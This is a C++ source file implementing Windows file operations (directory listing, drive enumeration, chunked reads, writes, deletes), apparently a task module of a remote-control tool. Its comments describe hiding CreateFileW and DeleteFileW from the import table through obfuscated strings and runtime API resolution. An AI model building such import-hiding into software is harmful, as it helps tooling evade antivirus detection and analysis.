#include "IFileOps.hpp"  // 你的 IFileOps 定义
#include <windows.h>
#include <fileapi.h>
#include <string>
#include <vector>
#include <fstream>
#include <chrono>

#include "Common/Obfuscation/StringObf.hpp"
#include "Core/Native/Win/ApiResolver.hpp"

// 取消 Windows 宏冲突
#undef CreateDirectory
#undef DeleteFile
#undef ReplaceFile

namespace cleat::Tasks {

    // 导入表脱敏: 文件操作组 CreateFileW/DeleteFileW 经 ApiResolver 运行时解析
    // (CreateDirectoryW 等中性 API 保留直调)。
    static const auto pCreateFileW =
        cleat::ApiResolver::Proc<HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD,
            LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)>(
            OBF_STR("kernel32.dll"), OBF_STR("CreateFileW"));
    static const auto pDeleteFileW =
        cleat::ApiResolver::Proc<BOOL(WINAPI*)(LPCWSTR)>(
            OBF_STR("kernel32.dll"), OBF_STR("DeleteFileW"));

    class FileOpsWin : public IFileOps {
    public:
        std::vector<FileEntry> ListDirectory(const std::string& path, std::string& error_msg) override {
            std::vector<FileEntry> entries;
            error_msg.clear();

            // 构造搜索路径
            std::wstring wpath = toNativePath(path);
            if (wpath.empty()) {
                error_msg = "Invalid path";
                return entries;
            }
            if (wpath.back() != L'\\' && wpath.back() != L'/') wpath += L'\\';
            wpath += L'*';

            WIN32_FIND_DATAW fd;
            HANDLE hFind = FindFirstFileW(wpath.c_str(), &fd);
            if (hFind == INVALID_HANDLE_VALUE) {
                DWORD err = GetLastError();
                if (err == ERROR_FILE_NOT_FOUND) error_msg = "Path not found";
                else if (err == ERROR_ACCESS_DENIED) error_msg = "Access denied";
                else error_msg = "FindFirstFile failed: " + std::to_string(err);
                return entries;
            }

            do {
                if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
                    continue;

                FileEntry entry;
                // 转换文件名 UTF-8
                int len = WideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1, nullptr, 0, nullptr, nullptr);
                if (len > 0) {
                    entry.name.resize(static_cast<std::basic_string<char, std::char_traits<char>, std::allocator<char>>::size_type>(len) - 1);
                    WideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1, &entry.name[0], len, nullptr, nullptr);
                }

                entry.is_directory = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                entry.is_hidden = (fd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) != 0;
                entry.is_readonly = (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0;

                if (!entry.is_directory) {
                    LARGE_INTEGER size{};
                    size.HighPart = fd.nFileSizeHigh;
                    size.LowPart = fd.nFileSizeLow;
                    entry.size_bytes = size.QuadPart;
                }

                // 修改时间
                ULARGE_INTEGER uli{};
                uli.LowPart = fd.ftLastWriteTime.dwLowDateTime;
                uli.HighPart = fd.ftLastWriteTime.dwHighDateTime;
                const uint64_t epoch_offset = 116444736000000000ULL;
                uint64_t ticks = uli.QuadPart - epoch_offset;
                auto duration = std::chrono::milliseconds(ticks / 10000);
                entry.modified_time = std::chrono::system_clock::time_point(duration);

                entries.push_back(std::move(entry));
            } while (FindNextFileW(hFind, &fd));

            FindClose(hFind);
            return entries;
        }

        bool CreateDirectory(const std::string& path) override {
            std::wstring wpath = toNativePath(path);
            return CreateDirectoryW(wpath.c_str(), nullptr) != 0;
        }

        bool FileExists(const std::string& path) override {
            std::wstring wpath = toNativePath(path);
            DWORD attr = GetFileAttributesW(wpath.c_str());
            return attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY);
        }

        bool DeleteFile(const std::string& path) override {
            std::wstring wpath = toNativePath(path);
            return pDeleteFileW && pDeleteFileW(wpath.c_str()) != 0;
        }

        std::vector<uint8_t> ReadFile(const std::string& path) override {
            std::vector<uint8_t> data;
            std::wstring wpath = toNativePath(path);
            HANDLE hFile = pCreateFileW ? pCreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr) : INVALID_HANDLE_VALUE;
            if (hFile == INVALID_HANDLE_VALUE) return data;

            LARGE_INTEGER size;
            GetFileSizeEx(hFile, &size);
            data.resize(size.QuadPart);
            DWORD read = 0;
            if (::ReadFile(hFile, data.data(), (DWORD)data.size(), &read, nullptr)) {
                data.resize(read);
            }
            ::CloseHandle(hFile);
            return data;
        }

        bool WriteFile(const std::string& path, const std::vector<uint8_t>& data) override {
            std::wstring wpath = toNativePath(path);
            HANDLE hFile = pCreateFileW ? pCreateFileW(wpath.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr) : INVALID_HANDLE_VALUE;
            if (hFile == INVALID_HANDLE_VALUE) return false;
            DWORD written;
            BOOL ok = ::WriteFile(hFile, data.data(), (DWORD)data.size(), &written, nullptr);
            ::CloseHandle(hFile);
            return ok && written == data.size();
        }

        bool ReadFileChunk(const std::string& path, uint64_t offset, size_t size, std::vector<uint8_t>& out) override {
            out.clear();
            std::wstring wpath = toNativePath(path);
            HANDLE hFile = pCreateFileW ? pCreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr) : INVALID_HANDLE_VALUE;
            if (hFile == INVALID_HANDLE_VALUE) return false;

            LARGE_INTEGER pos{};
            pos.QuadPart = static_cast<LONGLONG>(offset);
            if (SetFilePointerEx(hFile, pos, nullptr, FILE_BEGIN) == 0) {
                ::CloseHandle(hFile);
                return false;
            }

            out.resize(size);
            DWORD read = 0;
            BOOL ok = ::ReadFile(hFile, out.data(), static_cast<DWORD>(size), &read, nullptr);
            ::CloseHandle(hFile);
            out.resize(read);
            return ok != 0 || read > 0;
        }

        bool AppendFile(const std::string& path, const std::vector<uint8_t>& data) override {
            std::wstring wpath = toNativePath(path);
            HANDLE hFile = pCreateFileW ? pCreateFileW(wpath.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, nullptr,
                OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr) : INVALID_HANDLE_VALUE;
            if (hFile == INVALID_HANDLE_VALUE) return false;
            DWORD written = 0;
            BOOL ok = ::WriteFile(hFile, data.data(), (DWORD)data.size(), &written, nullptr);
            ::CloseHandle(hFile);
            return ok != 0 && written == data.size();
        }

        bool ReplaceFile(const std::string& tmp_path, const std::string& dest_path) override {
            std::wstring wtmp = toNativePath(tmp_path);
            std::wstring wdest = toNativePath(dest_path);
            // MOVEFILE_REPLACE_EXISTING: 原子替换已存在目标
            return MoveFileExW(wtmp.c_str(), wdest.c_str(),
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH) != 0;
        }

        uint64_t GetFileSize(const std::string& path) override {
            std::wstring wpath = toNativePath(path);
            HANDLE hFile = pCreateFileW ? pCreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr) : INVALID_HANDLE_VALUE;
            if (hFile == INVALID_HANDLE_VALUE) return 0;
            LARGE_INTEGER size{};
            GetFileSizeEx(hFile, &size);
            ::CloseHandle(hFile);
            return static_cast<uint64_t>(size.QuadPart);
        }

        std::vector<std::string> GetDrives(std::string& error_msg) override {
            error_msg.clear();
            std::vector<std::string> drives;
            DWORD mask = GetLogicalDrives();
            for (int i = 0; i < 26; ++i) {
                if (mask & (1 << i)) {
                    char letter = static_cast<char>('A' + i);
                    std::string drive = std::string(1, letter) + ":\\";
                    UINT type = GetDriveTypeA(drive.c_str());
                    if (type != DRIVE_NO_ROOT_DIR && type != DRIVE_UNKNOWN) {
                        drives.push_back(drive);
                    }
                }
            }
            return drives;
        }

    private:
        static std::wstring toNativePath(const std::string& path) {
            // UTF-8 -> UTF-16
            int len = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, nullptr, 0);
            if (len <= 0) return {};
            std::wstring wpath(len - 1, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, &wpath[0], len);

            // 统一分隔符: \\?\ 前缀路径只接受反斜杠,
            // 正斜杠(如 <LOCAL_PATH>)会直接导致 CreateFileW 失败
            for (auto& ch : wpath) {
                if (ch == L'/') ch = L'\\';
            }

            // 加长路径前缀
            if (wpath.length() >= 2 && wpath[1] == L':') {
                return L"\\\\?\\" + wpath;
            }
            return wpath;
        }
    };

   

} // namespace cleat::Tasks